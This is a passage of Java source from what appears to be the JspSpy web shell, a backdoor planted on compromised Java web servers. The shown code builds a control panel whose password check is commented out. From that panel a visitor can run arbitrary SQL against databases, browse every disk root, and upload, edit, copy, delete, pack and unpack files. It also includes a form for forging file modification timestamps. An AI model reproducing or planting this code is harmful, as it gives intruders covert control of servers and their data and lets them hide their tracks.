"		form.elements[\"selectDb\"].value = form.elements[\"db\"].selectedIndex;"+
"	}"+
"  </script>");
out.println("<table width=\"100%\" border=\"0\" cellpadding=\"15\" cellspacing=\"0\"><tr><td>"+
"<form name=\"form1\" id=\"form1\" action=\""+SHELL_NAME+"\" method=\"post\" >"+
"<input type=\"hidden\" id=\"selectDb\" name=\"selectDb\" value=\"0\"/>"+
"<h2>DataBase Manager &raquo;</h2>"+
"<input id=\"action\" type=\"hidden\" name=\"o\" value=\"dbc\" />"+
"<p>"+
"Driver:"+
"  <input class=\"input\" name=\"driver\" id=\"driver\" type=\"text\" size=\"35\"  />"+
"URL:"+
"<input class=\"input\" name=\"url\" id=\"url\" value=\"\" type=\"text\" size=\"90\"  />"+
"UID:"+
"<input class=\"input\" name=\"uid\" id=\"uid\" value=\"\" type=\"text\" size=\"10\"  />"+
"PWD:"+
"<input class=\"input\" name=\"pwd\" id=\"pwd\" value=\"\" type=\"text\" size=\"10\"  />"+
"DataBase:"+
" <select onchange='changeurldriver()' class=\"input\" id=\"db\" name=\"db\" >"+
" <option value='com.mysql.jdbc.Driver`jdbc:mysql://localhost:3306/mysql?useUnicode=true&characterEncoding=GBK'>Mysql</option>"+
" <option value='oracle.jdbc.driver.OracleDriver`jdbc:oracle:thin:@dbhost:1521:ORA1'>Oracle</option>"+
" <option value='com.microsoft.jdbc.sqlserver.SQLServerDriver`jdbc:microsoft:sqlserver://localhost:1433;DatabaseName=master'>Sql Server</option>"+
" <option value='sun.jdbc.odbc.JdbcOdbcDriver`jdbc:odbc:Driver={Microsoft Access Driver (*.mdb)};DBQ=C:\\ninty.mdb'>Access</option>"+
" <option value=' ` '>Other</option>"+
" </select>"+
"<input class=\"bt\" name=\"connect\" id=\"connect\" value=\"Connect\" type=\"submit\" size=\"100\"  />"+
"</p>"+
"</form></table><script>changeurldriver()</script>");
} else {
((Invoker)ins.get("dbc")).invoke(request,response,JSession);
}
} catch (ClassCastException e) {
throw e;
} catch (Exception e) {

throw e ;
}
}
}
//DBConnect
private static class DbcInvoker extends DefaultInvoker {
public void invoke(HttpServletRequest request,HttpServletResponse response,HttpSession JSession) throws Exception{
try {
PrintWriter out = response.getWriter();
String driver = request.getParameter("driver");
String url = request.getParameter("url");
String uid = request.getParameter("uid");
String pwd = request.getParameter("pwd");
String sql = request.getParameter("sql");
String selectDb = request.getParameter("selectDb");
if (selectDb == null)
selectDb = JSession.getAttribute("selectDb").toString();
else
JSession.setAttribute("selectDb",selectDb);
Object dbo = JSession.getAttribute(DBO);
if (dbo == null || !((DBOperator)dbo).isValid()) {
if (dbo != null)
((DBOperator)dbo).close();
dbo = new DBOperator(driver,url,uid,pwd,true);
} else {
if (!Util.isEmpty(driver) && !Util.isEmpty(url) && !Util.isEmpty(uid)) {
DBOperator oldDbo = (DBOperator)dbo;
dbo = new DBOperator(driver,url,uid,pwd);
if (!oldDbo.equals(dbo)) {
((DBOperator)oldDbo).close();
((DBOperator)dbo).connect();
} else {
dbo = oldDbo;
}
}
} 
DBOperator Ddbo = (DBOperator)dbo;
JSession.setAttribute(DBO,Ddbo);
if (!Util.isEmpty(request.getParameter("type")) && request.getParameter("type").equals("switch")) {
Ddbo.getConn().setCatalog(request.getParameter("catalog"));
}
Util.outMsg(out,"Connect To DataBase Success!");
out.println("  <script type=\"text/javascript\">"+
"	function changeurldriver(selectDb){"+
"		var form = document.forms[\"form1\"];"+
"		if (selectDb){"+
"			form.elements[\"db\"].selectedIndex = selectDb"+
"		}"+
"		var v = form.elements[\"db\"].value;"+
"		form.elements[\"url\"].value = v.split(\"`\")[1];"+
"		form.elements[\"driver\"].value = v.split(\"`\")[0];"+
"		form.elements[\"selectDb\"].value = form.elements[\"db\"].selectedIndex;"+
"	}"+
"  </script>");
out.println("<table width=\"100%\" border=\"0\" cellpadding=\"15\" cellspacing=\"0\"><tr><td>"+
"<form name=\"form1\" id=\"form1\" action=\""+SHELL_NAME+"\" method=\"post\" >"+
"<input type=\"hidden\" id=\"selectDb\" name=\"selectDb\" value=\""+selectDb+"\"/>"+
"<h2>DataBase Manager &raquo;</h2>"+
"<input id=\"action\" type=\"hidden\" name=\"o\" value=\"dbc\" />"+
"<p>"+
"Driver:"+
"  <input class=\"input\" name=\"driver\" value=\""+Ddbo.driver+"\" id=\"driver\" type=\"text\" size=\"35\" />"+
"URL:"+
"<input class=\"input\" name=\"url\" value=\""+Ddbo.url+"\" id=\"url\" value=\"\" type=\"text\" size=\"90\" />"+
"UID:"+
"<input class=\"input\" name=\"uid\" value=\""+Ddbo.uid+"\" id=\"uid\" value=\"\" type=\"text\" size=\"10\" />"+
"PWD:"+
"<input class=\"input\" name=\"pwd\" value=\""+Ddbo.pwd+"\" id=\"pwd\" value=\"\" type=\"text\" size=\"10\" />"+
"DataBase:"+
" <select onchange='changeurldriver()' class=\"input\" id=\"db\" name=\"db\" >"+
" <option value='com.mysql.jdbc.Driver`jdbc:mysql://localhost:3306/mysql?useUnicode=true&characterEncoding=GBK'>Mysql</option>"+
" <option value='oracle.jdbc.driver.OracleDriver`jdbc:oracle:thin:@dbhost:1521:ORA1'>Oracle</option>"+
" <option value='com.microsoft.jdbc.sqlserver.SQLServerDriver`jdbc:microsoft:sqlserver://localhost:1433;DatabaseName=master'>Sql Server</option>"+
" <option value='sun.jdbc.odbc.JdbcOdbcDriver`jdbc:odbc:Driver={Microsoft Access Driver (*.mdb)};DBQ=C:/ninty.mdb'>Access</option>"+
" <option value=' ` '>Other</option>"+
" </select>"+
"<input class=\"bt\" name=\"connect\" id=\"connect\" value=\"Connect\" type=\"submit\" size=\"100\" />"+
"</p>"+
"</form><script>changeurldriver('"+selectDb+"')</script>");
DatabaseMetaData meta = Ddbo.getConn().getMetaData();
out.println("<form action=\""+SHELL_NAME+"\" method=\"POST\">"+
"<p><input type=\"hidden\" name=\"selectDb\" value=\""+selectDb+"\"/><input type=\"hidden\" name=\"o\" value=\"executesql\"/><table width=\"200\" border=\"0\" cellpadding=\"0\" cellspacing=\"0\"><tr><td colspan=\"2\">Version : <b style='color:red;font-size:14px'><i>"+meta.getDatabaseProductName()+" , "+meta.getDatabaseProductVersion()+"</i></b><br/>URL : <b style='color:red;font-size:14px'><i>"+meta.getURL()+"</i></b><br/>Catalog : <b style='color:red;font-size:14px'><i>"+Ddbo.getConn().getCatalog()+"</i></b><br/>UserName : <b style='color:red;font-size:14px'><i>"+meta.getUserName()+"</i></b><br/><br/></td></tr><tr><td colspan=\"2\">Run SQL query/queries on database / <b><i>Switch Database :</i></b> ");
out.println("<select id=\"catalogs\" onchange=\"if (this.value == '0') return;doPost({o:'executesql',type:'switch',catalog:document.getElementById('catalogs').value})\">");
out.println("<option value='0'>-- Select a DataBase --</option>");
ResultSet dbs = meta.getCatalogs();
try {
while (dbs.next()){
out.println("<option value='"+dbs.getString(1)+"'>"+dbs.getString(1)+"</option>");
}
}catch(Exception ex) {
}
dbs.close();
out.println("</select></td></tr><tr><td><textarea id=\"sql\" name=\"sql\" class=\"area\" style=\"width:600px;height:50px;overflow:auto;\">"+Util.htmlEncode(Util.getStr(sql))+"</textarea><input class=\"bt\" name=\"submit\" type=\"submit\" value=\"Query\" /> <input class=\"bt\" onclick=\"doPost({o:'export',type:'queryexp',sql:document.getElementById('sql').value})\" type=\"button\" value=\"Export\" /> <input type='button' value='Export To File' class='bt' onclick=\"doPost({o:'vExport',type:'queryexp',sql:document.getElementById('sql').value})\"/></td><td nowrap style=\"padding:0 5px;\"></td></tr></table></p></form></table>");	
if (Util.isEmpty(sql)) {
String type = request.getParameter("type");
if (Util.isEmpty(type) || type.equals("switch")) {
ResultSet tbs = meta.getTables(null,null,null,null);
out.println(Table.rs2Table(tbs,meta.getIdentifierQuoteString(),true));
tbs.close();
} else if (type.equals("struct")) {
String tb = request.getParameter("table");
if (Util.isEmpty(tb))
return;
ResultSet t = meta.getColumns(null,null,tb,null);
out.println(Table.rs2Table(t,"",false));
t.close();
}
}
} catch (Exception e) {
JSession.setAttribute(MSG,"<span style='color:red'>Some Error Occurred. Please Check Out the StackTrace Follow.</span>"+BACK_HREF);
throw e;
}
}
}
private static class ExecuteSQLInvoker extends DefaultInvoker{
public void invoke(HttpServletRequest request,HttpServletResponse response,HttpSession JSession) throws Exception{
try {
PrintWriter out = response.getWriter();
String sql = request.getParameter("sql");
String db = request.getParameter("selectDb");
Object dbo = JSession.getAttribute(DBO);
if (!Util.isEmpty(sql)) {
if (dbo == null || !((DBOperator)dbo).isValid()) {
((Invoker)ins.get("vConn")).invoke(request,response,JSession);
return;
} else {
((Invoker)ins.get("dbc")).invoke(request,response,JSession);
Object obj = ((DBOperator)dbo).execute(sql);
if (obj instanceof ResultSet) {
ResultSet rs = (ResultSet)obj;
ResultSetMetaData meta = rs.getMetaData();
int colCount = meta.getColumnCount();
out.println("<b style=\"margin-left:15px\">Query#0 : "+Util.htmlEncode(sql)+"</b><br/><br/>");
out.println("<table border=\"0\" cellpadding=\"3\" cellspacing=\"0\" style=\"margin-left:15px\"><tr class=\"head\">");
for (int i=1;i<=colCount;i++) {
out.println("<td nowrap>"+meta.getColumnName(i)+"<br><span>"+meta.getColumnTypeName(i)+"</span></td>");
}
out.println("</tr>");
Table tb = new Table();
while(rs.next()) {
Row r = new Row();
for (int i = 1;i<=colCount;i++) {
String v = null;
try {
v = rs.getString(i);
} catch (SQLException ex) {
v = "<<Error!>>";
}
r.addColumn(new Column(v));
}
tb.addRow(r);
}
out.println(tb.toString());
out.println("</table><br/>");
rs.close();
((DBOperator)dbo).closeStmt();
} else {
out.println("<b style='margin-left:15px'>affected rows : <i>"+obj+"</i></b><br/><br/>");
}
}
} else {
((Invoker)ins.get("dbc")).invoke(request,response,JSession);
}
} catch (Exception e) {

throw e ;
}
}
}
private static class VLoginInvoker extends DefaultInvoker {
public boolean doBefore() {return false;}
public void invoke(HttpServletRequest request,HttpServletResponse response,HttpSession JSession) throws Exception{
try {
PrintWriter out = response.getWriter();
out.println("<html><head><title>jspspy</title><style type=\"text/css\">"+
"	input {font:11px Verdana;BACKGROUND: #FFFFFF;height: 18px;border: 1px solid #666666;}"+
"a{font:11px Verdana;BACKGROUND: #FFFFFF;}"+
"	</style></head><body><form method=\"POST\" action=\""+SHELL_NAME+"\">"+
"<!--<p style=\"font:11px Verdana;color:red\">Private Edition Dont Share It !</p>-->"+
"	  <p><span style=\"font:11px Verdana;\">Password: </span>"+
"        <input name=\"o\" type=\"hidden\" value=\"login\"/>"+
"        <input name=\"pw\" type=\"password\" size=\"20\"/>"+
"        <input type=\"hidden\" name=\"o\" value=\"login\"/>"+
"        <input type=\"submit\" value=\"Login\"/><br/>"+
"<!--<span style=\"font:11px Verdana;\">Copyright &copy; 2010</span>--></p>"+
"    </form><span style='font-weight:bold;color:red;font-size:12px'></span></body></html>");
} catch (Exception e) {

throw e ;
}
}
}
private static class LoginInvoker extends DefaultInvoker{
public boolean doBefore() {return false;}
public void invoke(HttpServletRequest request,HttpServletResponse response,HttpSession JSession) throws Exception{
try {
String inputPw = request.getParameter("pw");
//if (Util.isEmpty(inputPw) || !inputPw.equals(PW)) {
//((Invoker)ins.get("vLogin")).invoke(request,response,JSession);
//return;
//} else {
JSession.setAttribute(PW_SESSION_ATTRIBUTE,inputPw);
response.sendRedirect(SHELL_NAME);
return;
//}
} catch (Exception e) {

throw e ;
}
}
}
private static class MyComparator implements Comparator{
public int compare(Object obj1,Object obj2) {
							try {
								if (obj1 != null && obj2 != null) {
									File f1 = (File)obj1;
									File f2 = (File)obj2;
									if (f1.isDirectory()) {
										if (f2.isDirectory()) {
											return f1.getName().compareTo(f2.getName());
										} else {
											return -1;
										}
									} else { 
										if (f2.isDirectory()) {
											return 1;
										} else {
											return  f1.getName().toLowerCase().compareTo(f2.getName().toLowerCase());
										}
									}							
								}
								return 0;
							} catch (Exception e) {
								return 0;
							}
}
}
private static class FileListInvoker extends DefaultInvoker {
public void invoke(HttpServletRequest request,HttpServletResponse response,HttpSession JSession) throws Exception {
try {
String path2View = null;
PrintWriter out = response.getWriter();
String path = request.getParameter("folder");
String outEntry = request.getParameter("outentry");
if (!Util.isEmpty(outEntry) && outEntry.equals("true")) {
JSession.removeAttribute(ENTER);
JSession.removeAttribute(ENTER_MSG);
JSession.removeAttribute(ENTER_CURRENT_DIR);
}
Object enter = JSession.getAttribute(ENTER);
File file = null;
if (!Util.isEmpty(enter)) {
if (Util.isEmpty(path)) {
if (JSession.getAttribute(ENTER_CURRENT_DIR) == null)
path = "/";
else 
path = (String)(JSession.getAttribute(ENTER_CURRENT_DIR));
}
file = new EnterFile(path);
((EnterFile)file).setZf((String)enter);
JSession.setAttribute(ENTER_CURRENT_DIR,path);
} else {
if (Util.isEmpty(path))
path = JSession.getAttribute(CURRENT_DIR).toString();
JSession.setAttribute(CURRENT_DIR,Util.convertPath(path));
file = new File(path);
}
path2View = Util.convertPath(path);
if (!file.exists()) {
throw new Exception(path+"Dont Exists !");
}
File[] list = file.listFiles();
Arrays.sort(list,new MyComparator());
out.println("<div style='margin:10px'>");
String cr = null;
try {
cr = JSession.getAttribute(CURRENT_DIR).toString().substring(0,3);
}catch(Exception e) {
cr = "/";
}
File currentRoot = new File(cr);
out.println("<h2>File Manager - Current disk &quot;"+(cr.indexOf("/") == 0?"/":currentRoot.getPath())+"&quot; total (unknow)</h2>");
out.println("<form action=\""+SHELL_NAME+"\" method=\"post\">"+
"<table width=\"98%\" border=\"0\" cellpadding=\"0\" cellspacing=\"0\" style=\"margin:10px 0;\">"+
"  <tr>"+
"    <td nowrap>Current Directory  <input type=\"hidden\" name=\"o\" value=\"filelist\"/></td>"+
"	<td width=\"98%\"><input class=\"input\" name=\"folder\" value=\""+path2View+"\" type=\"text\" style=\"width:100%;margin:0 8px;\"/></td>"+
"    <td nowrap><input class=\"bt\" value=\"GO\" type=\"submit\"/></td>"+
"  </tr>"+
"</table>"+
"</form>");
out.println("<table width=\"98%\" border=\"0\" cellpadding=\"4\" cellspacing=\"0\">"+
"<form action=\""+SHELL_NAME+"?o=upload\" method=\"POST\" enctype=\"multipart/form-data\"><tr class=\"alt1\"><td colspan=\"7\" style=\"padding:5px;\">"+
"<div style=\"float:right;\"><input class=\"input\" name=\"file\" value=\"\" type=\"file\" /> <input class=\"bt\" name=\"doupfile\" value=\"Upload\" "+(enter == null ?"type=\"submit\"":"type=\"button\" onclick=\"alert('You Are In File Now ! Can Not Upload !')\"")+" /></div>"+
"<a href=\"javascript:new fso({path:'"+Util.convertPath(WEB_ROOT)+"'}).subdir('true')\">Web Root</a>"+
" | <a href=\"javascript:new fso({path:'"+Util.convertPath(SHELL_DIR)+"'}).subdir('true')\">Shell Directory</a>"+
" | <a href=\"javascript:"+(enter == null ? "new fso({}).mkdir()" : "alert('You Are In File Now ! Can Not Create Directory ! ')")+"\">New Directory</a> | <a href=\"javascript:"+(enter == null ? "new fso({}).createFile()" : "alert('You Are In File Now ! Can Not Create File !')")+"\">New File</a>"+
" | ");
File[] roots = file.listRoots();
for (int i = 0;i<roots.length;i++) {
File r = roots[i];
out.println("<a href=\"javascript:new fso({path:'"+Util.convertPath(r.getPath())+"'}).subdir('true');\">Disk("+Util.convertPath(r.getPath())+")</a>");
if (i != roots.length -1) {
out.println("|");
} 
}
out.println("</td>"+
"</tr></form>"+
"<tr class=\"head\"><td>&nbsp;</td>"+
"  <td>Name</td>"+
"  <td width=\"16%\">Last Modified</td>"+
"  <td width=\"10%\">Size</td>"+
"  <td width=\"20%\">Read/Write/Execute</td>"+
"  <td width=\"22%\">&nbsp;</td>"+
"</tr>");
if (file.getParent() != null) {
out.println("<tr class=alt1>"+
"<td align=\"center\"><font face=\"Wingdings 3\" size=4>=</font></td>"+
"<td nowrap colspan=\"5\"><a href=\"javascript:new fso({path:'"+Util.convertPath(file.getAbsolutePath())+"'}).parent()\">Goto Parent</a></td>"+
"</tr>");	
}
int dircount = 0;
int filecount = 0;
for (int i = 0;i<list.length;i++) {
						File f = list[i];
if (f.isDirectory()) {
dircount ++;
out.println("<tr class=\"alt2\" onMouseOver=\"this.className='focus';\" onMouseOut=\"this.className='alt2';\">"+
"<td width=\"2%\" nowrap><font face=\"wingdings\" size=\"3\">0</font></td>"+
"<td><a href=\"javascript:new fso({path:'"+Util.convertPath(f.getAbsolutePath())+"'}).subdir()\">"+f.getName()+"</a></td>"+
"<td nowrap>"+Util.formatDate(f.lastModified())+"</td>"+
"<td nowrap>--</td>"+
"<td nowrap>"+f.canRead()+" / "+f.canWrite()+" / unknow</td>"+
"<td nowrap>");
if (enter != null) 
out.println("&nbsp;");
else 
out.println("<a href=\"javascript:new fso({path:'"+Util.convertPath(f.getAbsolutePath())+"',filename:'"+f.getName()+"'}).removedir()\">Del</a> | <a href=\"javascript:new fso({path:'"+Util.convertPath(f.getAbsolutePath())+"'}).move()\">Move</a> | <a href=\"javascript:new fso({path:'"+Util.convertPath(f.getAbsolutePath())+"',filename:'"+f.getName()+"'}).pack(true)\">Pack</a>");
out.println("</td></tr>");
} else {
filecount++;
out.println("<tr class=\"alt1\" onMouseOver=\"this.className='focus';\" onMouseOut=\"this.className='alt1';\">"+
"<td width=\"2%\" nowrap><input type='checkbox' value='"+f.getName()+"'/></td>"+
"<td><a href=\"javascript:new fso({path:'"+Util.convertPath(f.getAbsolutePath())+"'}).down()\">"+f.getName()+"</a></td>"+
"<td nowrap>"+Util.formatDate(f.lastModified())+"</td>"+
"<td nowrap>"+Util.getSize(f.length(),'B')+"</td>"+
"<td nowrap>"+
""+f.canRead()+" / "+f.canWrite()+" / unknow </td>"+
"<td nowrap>"+
"<a href=\"javascript:new fso({path:'"+Util.convertPath(f.getAbsolutePath())+"'}).vEdit()\">Edit</a> | "+
"<a href=\"javascript:new fso({path:'"+Util.convertPath(f.getAbsolutePath())+"'}).down()\">Down</a> | "+
"<a href=\"javascript:new fso({path:'"+Util.convertPath(f.getAbsolutePath())+"'}).copy()\">Copy</a>");
if (enter == null ) {
out.println(" | <a href=\"javascript:new fso({path:'"+Util.convertPath(f.getAbsolutePath())+"'}).move()\">Move</a> | "+
"<a href=\"javascript:new fso({path:'"+Util.convertPath(f.getAbsolutePath())+"'}).vEditProperty()\">Property</a> | "+
"<a href=\"javascript:new fso({path:'"+Util.convertPath(f.getAbsolutePath())+"'}).enter()\">Enter</a>");
if (f.getName().endsWith(".zip") || f.getName().endsWith(".jar")) {
out.println(" | <a href=\"javascript:new fso({path:'"+Util.convertPath(f.getAbsolutePath())+"',filename:'"+f.getName()+"'}).unpack()\">UnPack</a>");
} else if (f.getName().endsWith(".rar")) {
out.println(" | <a href=\"javascript:alert('Dont Support RAR,Please Use WINRAR');\">UnPack</a>");
} else {
out.println(" | <a href=\"javascript:new fso({path:'"+Util.convertPath(f.getAbsolutePath())+"',filename:'"+f.getName()+"'}).pack()\">Pack</a>");
}
}
out.println("</td></tr>");
}
}
out.println("<tr class=\"alt2\"><td align=\"center\">&nbsp;</td>"+
"  <td>");
if (enter != null) 
out.println("<a href=\"javascript:alert('You Are In File Now ! Can Not Pack !');\">Pack Selected</a> - <a href=\"javascript:alert('You Are In File Now ! Can Not Delete !');\">Delete Selected</a>");
else 
out.println("<a href=\"javascript:new fso({}).packBatch();\">Pack Selected</a> - <a href=\"javascript:new fso({}).deleteBatch();\">Delete Selected</a>");
out.println("</td>"+
"  <td colspan=\"4\" align=\"right\">"+dircount+" directories / "+filecount+" files</td></tr>"+
"</table>");
out.println("</div>");
if (file instanceof EnterFile)
((EnterFile)file).close();
} catch (ZipException e) {
JSession.setAttribute(MSG,"\""+JSession.getAttribute(ENTER).toString()+"\" Is Not a Zip File. Please Exit.");
throw e;
} catch (Exception e) {
JSession.setAttribute(MSG,"File Does Not Exist Or You Dont Have Privilege."+BACK_HREF);
throw e;
}
}
}
private static class LogoutInvoker extends DefaultInvoker {
public boolean doBefore() {return false;}
public boolean doAfter() {return false;}
public void invoke(HttpServletRequest request,HttpServletResponse response,HttpSession JSession) throws Exception{
try {
Object dbo = JSession.getAttribute(DBO);
if (dbo != null)
((DBOperator)dbo).close();
Object obj = JSession.getAttribute(PORT_MAP);
if (obj != null) {
ServerSocket s = (ServerSocket)obj;
s.close();
}
Object online = JSession.getAttribute(SHELL_ONLINE);
if (online != null)
((OnLineProcess)online).stop();
JSession.invalidate();
((Invoker)ins.get("vLogin")).invoke(request,response,JSession);
} catch (ClassCastException e) {
JSession.invalidate();
((Invoker)ins.get("vLogin")).invoke(request,response,JSession);
} catch (Exception e) {

throw e ;
}
}
}
private static class UploadInvoker extends DefaultInvoker {
public boolean doBefore() {return false;}
public boolean doAfter() {return false;}
public void invoke(HttpServletRequest request,HttpServletResponse response,HttpSession JSession) throws Exception{
try {
UploadBean fileBean = new UploadBean();
response.getWriter().println(JSession.getAttribute(CURRENT_DIR).toString());
fileBean.setSavePath(JSession.getAttribute(CURRENT_DIR).toString());
fileBean.parseRequest(request);
File f = new File(JSession.getAttribute(CURRENT_DIR)+"/"+fileBean.getFileName());
if (f.exists() && f.length() > 0)
JSession.setAttribute(MSG,"<span style='color:green'>Upload File Success!</span>");
else
JSession.setAttribute("MSG","<span style='color:red'>Upload File Failed!</span>");
response.sendRedirect(SHELL_NAME);
} catch (Exception e) {
throw e ;
}
}
}
private static class CopyInvoker extends DefaultInvoker {
public void invoke(HttpServletRequest request,HttpServletResponse response,HttpSession JSession) throws Exception{
try {
String src = request.getParameter("src");
String to = request.getParameter("to");
InputStream in = null;
Object enter = JSession.getAttribute(ENTER);
if (enter == null)
in = new FileInputStream(new File(src));
else {
ZipFile zf = new ZipFile((String)enter);
ZipEntry entry = zf.getEntry(src);
in = zf.getInputStream(entry);
}
BufferedInputStream input = new BufferedInputStream(in);
BufferedOutputStream output = new BufferedOutputStream(new FileOutputStream(new File(to)));
byte[] d = new byte[1024];
int len = input.read(d);
while(len != -1) {
output.write(d,0,len);
len = input.read(d);
}
output.close();
input.close();
JSession.setAttribute(MSG,"Copy File Success!");
response.sendRedirect(SHELL_NAME);
} catch (Exception e) {

throw e ;
}
}
}
private static class BottomInvoker extends DefaultInvoker {
public boolean doBefore() {return false;}
public boolean doAfter() {return false;}
public void invoke(HttpServletRequest request,HttpServletResponse response,HttpSession JSession) throws Exception{
try {
response.getWriter().println("<div style=\"padding:10px;border-bottom:1px solid #fff;border-top:1px solid #ddd;background:#eee;\">Don't break my heart~"+
"</div>");
} catch (Exception e) {

throw e ;
}
}
}
private static class VCreateFileInvoker extends DefaultInvoker {
public void invoke(HttpServletRequest request,HttpServletResponse response,HttpSession JSession) throws Exception{
try {
PrintWriter out = response.getWriter();
String path = request.getParameter("filepath");
File f = new File(path);
if (!f.isAbsolute()) {
String oldPath = path;
path = JSession.getAttribute(CURRENT_DIR).toString();
if (!path.endsWith("/"))
path+="/";
path+=oldPath;
f = new File(path);
f.createNewFile();
} else {
f.createNewFile();
}
out.println("<table width=\"100%\" border=\"0\" cellpadding=\"15\" cellspacing=\"0\"><tr><td>"+
"<form name=\"form1\" id=\"form1\" action=\""+SHELL_NAME+"\" method=\"post\" >"+
"<h2>Create / Edit File &raquo;</h2>"+
"<input type='hidden' name='o' value='createFile'/>"+
"<p>Current File (import new file name and new file)<br /><input class=\"input\" name=\"filepath\" id=\"editfilename\" value=\""+path+"\" type=\"text\" size=\"100\" />"+
" <select name='charset' class='input'><option value='ANSI'>ANSI</option><option value='UTF-8'>UTF-8</option></select></p>"+
"<p>File Content<br /><textarea class=\"area\" id=\"filecontent\" name=\"filecontent\" cols=\"100\" rows=\"25\" ></textarea></p>"+
"<p><input class=\"bt\" name=\"submit\" id=\"submit\" type=\"submit\" value=\"Submit\"/> <input class=\"bt\" type=\"button\" value=\"Back\" onclick=\"history.back()\"/></p>"+
"</form>"+
"</td></tr></table>");
} catch (Exception e) {

throw e ;
}
}
}
private static class VEditInvoker extends DefaultInvoker {
public void invoke(HttpServletRequest request,HttpServletResponse response,HttpSession JSession) throws Exception{
try {
PrintWriter out = response.getWriter();
String path = request.getParameter("filepath");
String charset = request.getParameter("charset");
Object enter = JSession.getAttribute(ENTER);
InputStream input = null;
if (enter != null) {
ZipFile zf = new ZipFile((String)enter);
ZipEntry entry = new ZipEntry(path);
input = zf.getInputStream(entry);
} else {
File f = new File(path);
if (!f.exists())
return;
input = new FileInputStream(path);
}

BufferedReader reader = null;
if (Util.isEmpty(charset) || charset.equals("ANSI"))
reader = new BufferedReader(new InputStreamReader(input));
else
reader = new BufferedReader(new InputStreamReader(input,charset));
StringBuffer content = new StringBuffer();
String s = reader.readLine();
while (s != null) {
content.append(s+"\r\n");
s = reader.readLine();
}
reader.close();
out.println("<table width=\"100%\" border=\"0\" cellpadding=\"15\" cellspacing=\"0\"><tr><td>"+
"<form name=\"form1\" id=\"form1\" action=\""+SHELL_NAME+"\" method=\"post\" >"+
"<h2>Create / Edit File &raquo;</h2>"+
"<input type='hidden' name='o' value='createFile'/>"+
"<p>Current File (import new file name and new file)<br /><input class=\"input\" name=\"filepath\" id=\"editfilename\" value=\""+path+"\" type=\"text\" size=\"100\" />"+
" <select name='charset' id='fcharset' onchange=\"new fso({path:'"+path+"',charset:document.getElementById('fcharset').value}).vEdit()\" class='input'><option value='ANSI'>ANSI</option><option "+((!Util.isEmpty(charset) && charset.equals("UTF-8")) ? "selected" : "")+" value='UTF-8'>UTF-8</option></select></p>"+
"<p>File Content<br /><textarea class=\"area\" id=\"filecontent\" name=\"filecontent\" cols=\"100\" rows=\"25\" >"+Util.htmlEncode(content.toString())+"</textarea></p>"+
"<p>");
if (enter != null)
out.println("<input class=\"bt\" name=\"submit\" id=\"submit\" onclick=\"alert('You Are In File Now ! Can Not Save !')\" type=\"button\" value=\"Submit\"/>");
else 
out.println("<input class=\"bt\" name=\"submit\" id=\"submit\" type=\"submit\" value=\"Submit\"/>");
out.println("<input class=\"bt\"  type=\"button\" value=\"Back\" onclick=\"history.back()\"/></p>"+
"</form>"+
"</td></tr></table>");

} catch (Exception e) {

throw e ;
}
}
}
private static class CreateFileInvoker extends DefaultInvoker {
public boolean doBefore(){return false;}
public boolean doAfter(){return false;}
public void invoke(HttpServletRequest request,HttpServletResponse response,HttpSession JSession) throws Exception{
try {
PrintWriter out = response.getWriter();
String path = request.getParameter("filepath");
String content = request.getParameter("filecontent");
String charset = request.getParameter("charset");
BufferedWriter outs = null;
if (charset.equals("ANSI"))
outs = new BufferedWriter(new FileWriter(new File(path)));
else
outs = new BufferedWriter(new OutputStreamWriter(new FileOutputStream(new File(path)),charset));
outs.write(content,0,content.length());
outs.close();
JSession.setAttribute(MSG,"Save File <span style='color:green'>"+(new File(path)).getName()+"</span> With <span style='font-weight:bold;color:red'>"+charset+"</span> Success!");
response.sendRedirect(SHELL_NAME);
} catch (Exception e) {

throw e ;
}
}
}
private static class VEditPropertyInvoker extends DefaultInvoker {
public void invoke(HttpServletRequest request,HttpServletResponse response,HttpSession JSession) throws Exception{
try {
PrintWriter out = response.getWriter();
String filepath = request.getParameter("filepath");
File f = new File(filepath);
if (!f.exists())
return;
String read = f.canRead() ? "checked=\"checked\"" : "";
String write = f.canWrite() ? "checked=\"checked\"" : "";
Calendar cal = Calendar.getInstance();
cal.setTimeInMillis(f.lastModified());

out.println("<table width=\"100%\" border=\"0\" cellpadding=\"15\" cellspacing=\"0\"><tr><td>"+
"<form name=\"form1\" id=\"form1\" action=\""+SHELL_NAME+"\" method=\"post\" >"+
"<h2>Set File Property &raquo;</h2>"+
"<p>Current File (FullPath)<br /><input class=\"input\" name=\"file\" id=\"file\" value=\""+request.getParameter("filepath")+"\" type=\"text\" size=\"120\" /></p>"+
"<input type=\"hidden\" name=\"o\" value=\"editProperty\"/> "+
"<p>"+
"  <input type=\"checkbox\" disabled "+read+" name=\"read\" id=\"checkbox\"/>Read "+
"  <input type=\"checkbox\" disabled "+write+" name=\"write\" id=\"checkbox2\"/>Write "+
"</p>"+
"<p>Instead &raquo;"+
"year:"+
"<input class=\"input\" name=\"year\" value="+cal.get(Calendar.YEAR)+" id=\"year\" type=\"text\" size=\"4\" />"+
"month:"+
"<input class=\"input\" name=\"month\" value="+(cal.get(Calendar.MONTH)+1)+" id=\"month\" type=\"text\" size=\"2\" />"+
"day:"+
"<input class=\"input\" name=\"date\" value="+cal.get(Calendar.DATE)+" id=\"date\" type=\"text\" size=\"2\" />"+
""+
"hour:"+
"<input class=\"input\" name=\"hour\" value="+cal.get(Calendar.HOUR)+" id=\"hour\" type=\"text\" size=\"2\" />"+
"minute:"+
"<input class=\"input\" name=\"minute\" value="+cal.get(Calendar.MINUTE)+" id=\"minute\" type=\"text\" size=\"2\" />"+
"second:"+
"<input class=\"input\" name=\"second\" value="+cal.get(Calendar.SECOND)+" id=\"second\" type=\"text\" size=\"2\" />"+
"</p>"+
"<p><input class=\"bt\" name=\"submit\" value=\"Submit\" id=\"submit\" type=\"submit\" value=\"Submit\"/> <input class=\"bt\" name=\"submit\" value=\"Back\" id=\"submit\" type=\"button\" onclick=\"history.back()\"/></p>"+
"</form>"+
"</td></tr></table>");
} catch (Exception e) {
throw e ;
}
}
}
private static class EditPropertyInvoker extends DefaultInvoker {
public boolean doBefore(){return false;}
public boolean doAfter(){return false;}
public void invoke(HttpServletRequest request,HttpServletResponse response,HttpSession JSession) throws Exception{
try {
String f = request.getParameter("file");
File file = new File(f);
if (!file.exists())
return;

String year = request.getParameter("year");
String month = request.getParameter("month");
String date = request.getParameter("date");
String hour = request.getParameter("hour");
String minute = request.getParameter("minute");
String second = request.getParameter("second");

Calendar cal = Calendar.getInstance();
cal.set(Calendar.YEAR,Integer.parseInt(year));
cal.set(Calendar.MONTH,Integer.parseInt(month)-1);
cal.set(Calendar.DATE,Integer.parseInt(date));
